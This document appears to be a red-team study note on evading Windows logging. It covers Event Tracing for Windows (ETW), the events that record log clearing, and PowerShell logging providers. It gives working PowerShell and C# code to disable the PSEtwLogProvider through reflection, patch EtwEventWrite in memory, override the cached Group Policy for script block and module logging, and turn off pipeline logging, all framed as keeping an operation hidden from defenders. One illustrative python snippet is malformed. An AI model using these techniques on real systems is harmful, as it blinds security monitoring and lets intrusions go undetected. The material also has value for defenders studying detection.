# What is logging
One of the largest obstacles in our path is logging and monitoring. Unlike [[Antivirus]] and EDR solutions, logging creates a physical record of activity that can be analyzed for malicious activity.
How a device is monitored will depend on the environment and preferences of the corporation. Teams may decide not to monitor some devices at all. Generally, a monitoring solution will begin at the host device, collecting application or event logs. Once logs are created, they can be kept on the device or sent to an event collector/forwarder. Once they are off the device, the defense team decides how to aggregate them, this is generally accomplished using an indexer and a **Security Information and Event Manager** (SIEM).
![[Pasted image 20240909212722.png]]
We may not have much control once logs are taken off a device, but we can control what is on the device and how it is ingested. The primary target for us is the event logs, managed and controlled by the **Event Tracing for Windows** (ETW).
## Event Tracing
As mentioned, almost all event logging capabilities within Windows is handled from ETW at both the application and kernel level. While there are other services in place like **Event Logging** and **Trace Logging**, these are either extensions of ETW or less prevalent to attackers.

| **Component** | **Purpose**                  |
| ------------- | ---------------------------- |
| Controllers   | Build and configure sessions |
| Providers     | Generate events              |
| Consumers     | Interpret events             |
While less important to us than components, event IDs are a core feature of Windows logging. Events are sent and transferred in XML format which is the standard for how events are defined and implemented by providers. Below is an example of event ID 4624: *an account was successfully logged on*
```jsx
Event ID:4624
Source:Security
Category:Logon/Logoff
Message:An account was successfully logged on.

Subject:
Security ID: NT AUTHORITY\\SYSTEM
Account Name: WORKSTATION123$
...
[ snip ]
...
Logon Type: 7

New Logon:
Security ID: CORPDOMAIN\\john.doe
Account Name: john.doe
...
[ snip ]
...
Process Information:
Process ID: 0x314
```

---

ETW has visibility over a majority of the operating system, whereas logging generally has a limited visibility or detail. Due to this visibility, we should always be mindful of the events that could be generated when carrying out our operation. The bet approach to take down ETW is to limit its insights as much as possible into specifically what we are doing while maintaining environment integrity.

## Approaches to Log Evasion
When first thinking about assessing log evasion, we may think that simply destroying or tampering with the logs may be viable.
Following security best practices, it is typical for a modern environment to employ log forwarding. Log forwarding means that the SOC will move or "forward" logs from the host machine to a central server or indexer. Even if we can delete logs from the host machine, they could already be off of the device and secured.
Assuming we did destroy al the logs before they were forwarded, or if they were not forwarded, how would this raise an alert? We must first consider environment integrity, if no logs originate from a device, that can present serious suspicion and lead to an investigation. Even if we controlled which logs are removed, defenders could still track

| **Event ID** | **Purpose**                                           |
| ------------ | ----------------------------------------------------- |
| 1102         | Logs when the Windows Security audit log was cleared  |
| 104          | Logs when the log file was cleared                    |
| 1100         | Logs when the Windows Event Log service was shut down |
These essentially monitor the process of destroying logs. Clearly a problem for us. Although it is possible to bypass these mitigations further or tamper with the logs, we must still asses the risk. When approaching an environment, we are generally unaware of security practices and take an **Operation Security** (OPSEC) risk by attempting this approach.

We instead should be focusing on what logs a malicious technique may result in to keep an environment's integrity intact. Knowing what may be used against us, we can utilize or modify known methods.
Most published techniques will target ETW components since that will allow us the most control over the tracing process.

## Tracing Instrumentation
ETW is broken up into three separate components, working together to manage and correlate data. **Event logs** in Windows are no different from generic XML data, making it easy to process and interpret.
- **Event controllers** are used to build and configure sessions. They work as an application that determines how and where data will flow. They define the size and location of the log file, start and stop event tracing sessions, enable providers so they can log events to the session, manage the size of the buffer pool and obtain execution statistics for sessions.
- **Event providers** are used to generate events. The controller will tell the provider how to operate, then they will collect from its designated source. Providers work as applications that contain even tracing tools. After a provider registers itself, a controller can then enable or disable event tracing in the provider. The provider defines its interpretation of being enabled or disabled. Generally, an enabled provider generates events, while a disabled does not.
	- There are also four types of providers with support for various functions and legacy systems.

| **Provider**                              | **Purpose**                                                                                                                                                                                                   |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| MOF (Managed Object Format)               | Defines events from MOF classes. Enabled by one trace session at a time.                                                                                                                                      |
| WPP (Windows Software Trace Preprocessor) | Associated with [TMF(Trace Message Format)](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) files to decode information. Enabled by one trace session at a time. |
| Manifest-Based                            | Defines events from a manifest. Enabled by up to eight trace sessions at a time.                                                                                                                              |
| TraceLogging                              | Self-describing events containing all required information. Enabled by up to eight trace sessions at a time.                                                                                                  |
- **Event Consumers** are used to interpret events. The consumer will select sessions and parse events from that session or multiple at the same time. This is the most commonly seen in the "Event Viewer". Consumers are applications that select one or more event tracing sessions as a source of events. A consumer can request events from multiple event tracing sessions simultaneously, the system then delivers the events in chronological order. Consumers can receive events stored in log files or from sessions that deliver events in real time.
Each of these components can be brought together to fully understand and depict data flow within ETW
![[Pasted image 20240911012527.png]]
From start to finish, events originate from the providers. Controllers will determine where the data is sent and how it is processed through sessions. And Consumers will save or deliver logs to be interpreter or analyzed.

Our goal being limiting visibility while maintaining our integrity, we can leverage this knowledge to limit a specific aspect of insight by targeting components while maintaining most of the data flow. We have some techniques that can target each ETW component

| **Component  <br>** | **Techniques**                                                                          |
| ------------------- | --------------------------------------------------------------------------------------- |
| Provider            | PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation |
| Controller          | Patching EtwEventWrite, Runtime Tracing Tampering,                                      |
| Consumers           | Log Smashing, Log Tampering                                                             |
# Reflection
Within Powershell, ETW providers are loaded into the session from a .NET assembly: `PSEtwLogProvider`.
in Powershell most .NET assemblies are loaded in the same security context as the user at startup. Since ethe session has the same privilege level as the loaded assemblies, we can modify the assembly fields and values through PS reflection. Reflection allows us to look inside an assembly and find out its characteristics. Inside a .NET assembly, we can find Metadata that can tell us what it is that the file contains.
For ETW, we can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.
At a high level, the process can be broken up into
1. Obtaining .NET assembly for `PSEtwLogProvider`.
2. Store the static class for the `etwProvider` field.
3. Set the field for `m_enabled` to the stored value.
```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```
So first, we obtain the type for the assembly. We store it in order to access its internal fields later. Then, we store the static field itself from the previous assembly, by passing `$null` as an argument. Finally, we overwrite the `m_enabled` field, with the value stored in the previous line. 
Once we execute it or append it to our malware, we should see, that we are no longer generating events, as the provider is essentially dead. Keep in mind using this script as is, creates seven events.

# Patching Tracing Functions
ETW is loaded from the runtime of every new process, commonly originating from the CLR. Within a new process, ETW events are sent from the userland and issued directly from the current process. An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality. 

---

Patching at the most basic level, we are trying to force an application to quit or return before reaching the function we want to patch. For example, if we have the following code
```python
x = 1
y = 3
return x + y
# output = 4
```
But if we patch it, we can have
```python
x = 1 
return x
int y = 3
return x + y
```
So the program will not be able to complete subsequent lines.
Adapting this concept to our objective, if we can identify how the return is called in memory we can write it to the function and expect it to run before any other lines. We are expecting that the return is placed at the top because the stack uses a **Last In First Out** (LIFO) structure. 
![[Pasted image 20240912005812.png]]

---

Now, first of all, we need to identify a malicious function and possible points that we can return from. Thanks to previous research, we know that from the CLR, ETW is written from the function `EtwEventWrite`. To identify "patch points" or returns, we can view the disassembly of the function
```wasm
779f2459 33cc		       xor	ecx, esp
779f245b e8501a0100	   call	ntdll!_security_check_cookie
779f2460 8be5		       mov	esp, ebp
779f2462 5d		         pop	ebp
779f2463 c21400		     ret	14h 
```
When observing the function, we are looking for an opcode that will return the function or stop the execution of the function. We can determine that `ret 14h` will end the function and return to the previous application. As the `ret` instruction transfers control to the return address located on the stack. Essentially popping the last value placed on the stack, and the parameter (`14h`) will define the number of bytes or words released once the stack is popped.
To make useless the function, we can write the opcode bytes of `ret14h`, `c21400` to memory to patch the function.
![[Pasted image 20240912010921.png]]

---

ETW patching can be broken up into:
1. Obtaining a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

Firstly, to obtain the handle. This function is stored within `ntdll`. we will load the library and then obtain the handle using `GetProcAddress`.
```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```
Then, to modify the memory permissions to allow us to write to the function. These are defined by the `flNewProtect` parameter, and we can use `0x40` to enable X,R, or RW access.
```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```
Then, because we are writing to a function and not a process, we need to use `Marshal.Copy` to write our opcode. Which we know by having checked the assembly earlier.
```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```
At step four, we can begin cleaning our steps by restoring memory permissions to normal
```cs
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```
Finally, ensuring the patched function will be executed from the instruction cache
```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```
Having compiled and execute this, we can view the disassembled function again to observe the patch.
```wasm
779f23c0 c21400		    ret	14h
779f23c3 00ec		      add	ah, ch
779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
779f23c8 81ece0000000	sub	esp, 0E0h
```
And here we have our confirmation. Once the function is patched in memory, it will always return (end the process) when `EtwEventWrite` is called.

Although pretty cool, it might not be the best approach as it will restrict more logs than we may want for integrity.

# Group Policy Takeover
## Providers via Policy
ETW has a lot of coverage out of the box, but it will disable some features unless specified because of the amount of logs that it can create. These features can be enabled by modifying the GPO setting of their parent policy. Two of the most popular GPO providers provide coverage over PowerShell, including **script block logging** and **module logging**.

Script block logging will log any script blocks executed within a PS sessions. Introduced in PS v4 and improved in PS v5, the ETW provider has two event IDs it will report.

| **Event ID** | **Purpose**                 |
| ------------ | --------------------------- |
| 4103         | Logs command invocation     |
| 4104         | Logs script block execution |
The most prevalent being ID 4104, as it can expose our scripts if not properly obfuscated or hidden. An example of this kind of log
```xml
Event ID:4104
Source:Microsoft-Windows-PowerShell
Category:Execute a Remote Command
Log:Microsoft-Windows-PowerShell/Operational
Message:Creating Scriptblock text (1 of 1):
Write-Host PowerShellV5ScriptBlockLogging

ScriptBlock ID: 6d90e0bb-e381-4834-8fe2-5e076ad267b3
Path:
```
Module logging is a very verbose provider that will log any modules and data sent from it. Introduced in PS v3, each module within a session acts as a provider and logs its own module. Similar to the previous provider, the modules will write events to event ID 4103.
```xml
Event ID:4103
Source:Microsoft-Windows-PowerShell
Category:Executing Pipeline
Log:Microsoft-Windows-PowerShell/Operational

Message:CommandInvocation(Write-Host): "Write-Host"
ParameterBinding(Write-Host): name="Object"; 
value="TestPowerShellV5"

Context:
Severity = Informational
Host Name = ConsoleHost
...
[snip]
...
User = DOMAIN\\username
Connected User =
Shell ID = Microsoft.PowerShell
```
Event ID 4103 is less prevalent to us because of the amount of logs created. This can often result in it being treated with less severity or being disabled.

---

Although we have ETW patches, they may not be practical or the best approach to evade logging in certain situations. As an alternative, we can target these providers to slowly limit visibility while not being as obvious or noisy as other techniques.
The general goal of disabling these providers is to limit the visibility of componentes we require while still making the environment seem untampered.

## Takeover
The module logging and script block logging providers are both enabled from a group policy, `Administrative Templates -> Windows Components -> Windows PowerShell`. As mentioned, within a PS session, system assemblies are loaded in the same security context as users. Meaning that we have the same privileges as the assemblies that cache GPO settings. Using reflection, we can obtain the utility dictionary and modify the group policy for either PS provider.

Group policy takeover can be broken up into:
1. Obtain group policy settings from the utility cache
2. Modify generic provider to `0`
3. Modify the invocation or module definition

Firstly, we use reflection to obtain the type of `System.Management.Automation.Utils` and identify the GPO cache field: `cachedGroupPolicySettings`
```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```
Then, we leverage the GPO variable to modify either event provider settings to `0`. `EnableScriptBlockLogging` will control 4104 events, limiting the visibility of script execution. Modification can be accomplished by writing the object or registry directly.
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```
Finally, we can repeat the previous step with any other provider. `EnableScriptBlockInvocationLogging` will control ID 4103 events, limiting the visibility of cmdlet and pipeline execution.
```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```
Note, that the core functionality of the script is identical to the above code but slightly modified to comply with PS v5.1 updates.
By executing this, we can see that we no longer generate events corresponding to the IDs we just disabled.

# Abusing Log Pipeline
Within PS, each module or snap-in has a setting that anyone can use to modify its logging functionality. When the `LogPipelineExecutionDetails` property value is true, PS writes cmdlet and function execution events in the session to the PS log in Event Viewer.
We can change this value to false in any PS session to disable a module logging for that specific session. The docs even note the ability to disable logging from a user session.

The log pipeline technique can be broken up into:
1. Obtain target module
2. Set the module execution details to false
3. Obtain the module snap-in
4. Set snap-in execution details to false

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```
Easily enough, this script can be either appended or run as is, to disable module logging of currently imported modules.